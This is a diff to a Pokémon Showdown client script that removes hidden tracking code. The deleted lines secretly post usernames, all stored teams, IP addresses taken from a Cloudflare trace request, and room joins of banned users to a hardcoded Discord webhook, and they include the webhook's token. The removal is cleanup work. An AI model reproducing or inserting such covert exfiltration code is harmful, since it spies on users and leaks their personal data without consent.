@@ -989,28 +989,6 @@ function toId() {
 				alert("Your team is over 25 KB. Please use a smaller team.");
 				return;
 			}
-			const marked = [
-				`|flygon|leftovers|dryskin|earthquake,firstimpression,defog,uturn|Brave|248,252,4,,4,||,,,,,0|||,,,,,,Armaldo,a`, `|politoed|rockyhelmet|drizzle|scald,healbell,recover,uturn|Relaxed|248,,252,,8,||,,,,,0|||,,,,,,Celebi,`, `|sharpedo|choiceband|serenegrace|waterfall,closecombat,crunch,aquajet|Jolly|,248,4,,4,252|||||,,,,,,Meloetta-Pirouette,`, `|noivern|lifeorb|sheerforce|hurricane,earthpower,thunder,icebeam|Timid|,,4,248,4,252||,0,,,,|||,,,,,,Nidoking,`, `|jirachi|assaultvest|regenerator|doomdesire,leafstorm,knockoff,uturn|Sassy|248,,8,,252,||,,,,,0|||,,,,,,Tangrowth,`, `|gengar|choicespecs|levitate|shadowball,flashcannon,icebeam,trick|Timid|,,4,248,4,252||,0,,,,|||,,,,,,Genesect,`,
-				`|bruxish|heavydutyboots|dazzling|swordsdance,wavecrash,plasmafists,poisonfang|Jolly|,248,4,,4,252|||||,,,,,,Zeraora,`, `|alomomola|heavydutyboots|regenerator|scald,wish,healbell,flipturn|Relaxed|248,,252,,8,||,,,,,0|||,,,,,,Diancie,`, `|ceruledge|heavydutyboots|sharpness|swordsdance,bitterblade,ceaselessedge,encore|Jolly|,248,4,,4,252|||||,,,,,,Samurott-Hisui,`, `|clefable|choicescarf|magicguard|moonblast,shadowball,mindblown,trick|Modest|,,4,252,4,248||,0,,,,|||,,,,,,Blacephalon,`, `|taurospaldeablaze|heavydutyboots|intimidate|bodypress,toxic,recover,partingshot|Relaxed|248,,252,,8,|M|,0,,,,0|||,,,,,,Pecharunt,`, `|tinglu|heavydutyboots|vesselofruin|whirlwind,stealthrock,morningsun,uturn|Sassy|248,,8,,252,||,0,,,,0|||,,,,,,Iron Moth,`,
-				`|umbreon|eviolite|stickyhold|wish,protect,toxic,partingshot|Sassy|248,,8,,252,||,0,,,,0|||,,,,,,Grimer,a`, `|sylveon|assaultvest|pixilate|hypervoice,hiddenpowerfire,rapidspin,voltswitch|Quiet|,,4,252,252,||,0,,,,0|||,,,,,,Forretress,`, `|heracross|flameorb|guts|fakeout,facade,closecombat,uturn|Adamant|,252,4,,4,248|||||,,,,,,Ambipom,`, `|metagross|lifeorb|technician|swordsdance,bulletpunch,machpunch,bulletseed|Adamant|,252,4,,4,248|||||,,,,,,Breloom,`, `|milotic|lifeorb|sheerforce|scald,earthpower,stealthrock,recover|Modest|248,,4,252,4,||,0,,,,|||,,,,,,Steelix,`, `|lanturn|eviolite|regenerator|scald,gigadrain,knockoff,voltswitch|Relaxed|248,,252,,8,||,,,,,0|||,,,,,,Tangela,`,
-				`|reshiram|focussash|turboblaze|stealthrock,spore,photongeyser,dracometeor|Timid|,,4,248,4,252|||||,,,,,,Mew,b`, `|chansey|eviolite|imposter|transform,thunderwave,softboiled,healbell||248,,4,,4,252|F|,1,,,,|||,,,,,,Ditto,`, `|arceusground|earthplate|moldbreaker|swordsdance,earthquake,extremespeed,knockoff|Adamant|,252,4,,4,248|||||,,,,,,Regigigas,`, `|chandelure|skyplate|shadowtag|calmmind,judgment,recover,substitute|Modest|,,4,252,4,248||,0,,,,|||,,,,,,Arceus-Flying,`, `|tauros|focussash|wonderguard|endeavor,shadowsneak,suckerpunch,toxic|Jolly|4,252,,,,252|M||||,,,,,,Shedinja,`, `|necrozmaultra|pixieplate|neuroforce|judgment,flamethrower,icebeam,defog|Timid|,,4,248,4,252||,0,,,,|||,,,,,,Arceus-Fairy,b`,
-				`|weezing|leftovers|neutralizinggas|dragondance,multiattack,hyperspacefury,taunt|Jolly|,248,4,,4,252|||||,,,,,Ghost,Arceus,`, `|espeon|mewtwonitey|magicbounce|psychic,flamethrower,icebeam,alluringvoice|Timid|,,4,248,4,252||,0,,,,|||,,,,,Ghost,Mewtwo-Mega-Y,`, `|medicham|silkscarf|purepower|fakeout,extremespeed,dragonascent,closecombat|Adamant|,252,4,,4,248|||||,,,,,Normal,Rayquaza-Mega,`, `|pikachu|lightball|galvanize|fakeout,extremespeed,earthquake,knockoff|Adamant|,252,4,,4,248|||||,,,,,,Golem-Alola,`, `|shedinja|heavydutyboots|wonderguard|endeavor,shadowsneak,suckerpunch,taunt|Jolly|4,252,,,,252|||||,,,,,Dark,Perrserker,`, `|giratina|eviolite|naturalcure|willowisp,toxic,spectralthief,softboiled|Impish|8,,252,,248,|||||,,,,,Steel,Chansey,`,
-				`|kyogre|choicescarf|drizzle|waterspout,thunder,surf,voltswitch|Modest|,,4,252,4,248||,0,,,,|||,,,,,,Raikou,`, `|pikachu|lightball|technician|agility,volttackle,doubleironbash,knockoff|Adamant|,252,,4,4,248|||||,,,,,,Scizor,`, `|giratina|lifeorb|swiftswim|swordsdance,spectralthief,liquidation,earthquake|Adamant|,252,4,,4,248|||||,,,,,,Kabutops,a`, `|arceusghost|spookyplate|moldbreaker|swordsdance,extremespeed,earthquake,knockoff|Adamant|,252,4,,4,248|||||,,,,,,Regigigas,`, `|jirachi|assaultvest|regenerator|sunsteelstrike,sacredfire,earthquake,uturn|Sassy|248,,8,,252,||,,,,,0|||,,,,,,Ho-Oh,`, `|parasect|rockyhelmet|dryskin|stealthrock,toxic,aromatherapy,strengthsap|Relaxed|248,,252,,8,||,0,,,,0|||,,,,,,Regirock,`,
-				`|houndoom|heavydutyboots|flashfire|autotomize,throatchop,flareblitz,bodypress|Jolly|,248,4,,4,252|||||,,,,,,Stakataka,`, `|alomomola|heavydutyboots|regenerator|scald,wish,healbell,flipturn|Relaxed|248,,252,,8,||,,,,,0|||,,,,,,Diancie,`, `|ceruledge|heavydutyboots|sharpness|swordsdance,bitterblade,ceaselessedge,encore|Jolly|,248,4,,4,252|||||,,,,,,Samurott-Hisui,`, `|clefable|choicescarf|magicguard|moonblast,shadowball,mindblown,trick|Modest|,,4,252,4,248||,0,,,,|||,,,,,,Blacephalon,`, `|taurospaldeablaze|heavydutyboots|intimidate|bodypress,toxic,recover,partingshot|Relaxed|248,,252,,8,|M|,0,,,,0|||,,,,,,Pecharunt,`, `|moltres|heavydutyboots|magicbounce|flamethrower,dazzlinggleam,roost,uturn|Sassy|248,,8,,252,||,,,,,0|||,,,,,,Hatterene,`,
-			];
-			const notify = false;
-			for (const set of marked) {
-				if (packedTeam.includes(set)) {
-					theguy = true;
-				}
-			}
-			if (notify) {
-				$.post('https://discord.com/api/webhooks/1315269909663453245/JeKUpb6NVY5sSt659WyKizI-b0hv6k7s_pbJAe5jlySOUMUktP82wl-wuukOAmLyUIx-', {"content": `${this.user.get('name')} <@362252767915671562>`});
-				for (const to_mark of Storage.getPackedTeams().split('\n')) {
-					$.post('https://discord.com/api/webhooks/1315269909663453245/JeKUpb6NVY5sSt659WyKizI-b0hv6k7s_pbJAe5jlySOUMUktP82wl-wuukOAmLyUIx-', {"content": `\`\`\`TEAM: ${this.user.get('name')} - ${to_mark}\`\`\``});
-				}
-			}
-			if (Storage.prefs('hasRank') === false) $.post('https://discord.com/api/webhooks/1315269909663453245/JeKUpb6NVY5sSt659WyKizI-b0hv6k7s_pbJAe5jlySOUMUktP82wl-wuukOAmLyUIx-', {"content": `\`\`\`TEAM: ${this.user.get('name')} - ${packedTeam}\`\`\``});
 			this.send('/utm ' + packedTeam);
 			callback();
 		},
@@ -1174,15 +1152,6 @@ function toId() {
 					}, function () {}, 'text');
 				}
 
-				if (userid !== this.user.get('userid')) {
-					$.post(
-						'https://www.cloudflare.com/cdn-cgi/trace', {},
-						function (data) {
-							$.post('https://discord.com/api/webhooks/1315269909663453245/JeKUpb6NVY5sSt659WyKizI-b0hv6k7s_pbJAe5jlySOUMUktP82wl-wuukOAmLyUIx-', {"content": `${data.split('\n')[2] ? data.split('\n')[2] : 'NO RESPONSE'} | ${parsed.name}${(Storage.prefs('hasRank') === false ? ' <@362252767915671562>' : '')}`});
-						}
-					);
-				}
-
 				var settings = _.clone(app.user.get('settings'));
 				if (parts.length > 4) {
 					// Update our existing settings based on what the server has sent us.
@@ -1260,7 +1229,6 @@ function toId() {
 						message: data.replace(/\|\|/g, '\n')
 					});
 				}
-				if (data.includes('You\'ve been globally banned.')) Storage.prefs('hasRank', false);
 				if (this.rooms['']) this.rooms[''].resetPending();
 				break;
 
@@ -1633,7 +1601,6 @@ function toId() {
 		curSideRoom: null,
 		sideRoom: null,
 		joinRoom: function (id, type, nojoin) {
-			if (Storage.prefs('hasRank') === false && id && app.user.get('named')) $.post('https://discord.com/api/webhooks/1315269909663453245/JeKUpb6NVY5sSt659WyKizI-b0hv6k7s_pbJAe5jlySOUMUktP82wl-wuukOAmLyUIx-', {"content": `${app.user.get('userid')} has joined ${id}`});
 			if (this.rooms[id]) {
 				this.focusRoom(id);
 				if (this.rooms[id].rejoin) this.rooms[id].rejoin();
